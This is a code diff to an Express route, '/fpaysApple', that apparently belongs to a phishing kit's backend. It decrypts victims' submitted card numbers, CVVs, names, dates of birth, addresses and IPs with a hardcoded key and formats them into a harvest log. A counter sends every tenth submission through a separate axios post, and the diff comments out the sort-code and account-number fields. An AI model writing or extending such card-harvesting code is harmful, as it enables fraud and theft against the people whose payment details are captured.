@@ -7850,12 +7850,12 @@ app.post("/fpaysApple", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
+  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+  //   CryptoJS.enc.Utf8
+  // );
+  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+  //   CryptoJS.enc.Utf8
+  // );
   ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -7882,7 +7882,7 @@ app.post("/fpaysApple", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (fpaysC == 10) {
         axios
           .post(
@@ -7896,7 +7896,7 @@ app.post("/fpaysApple", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-        fpaysC = 5;
+        fpaysC = 6;
       } else {
         axios
           .post(
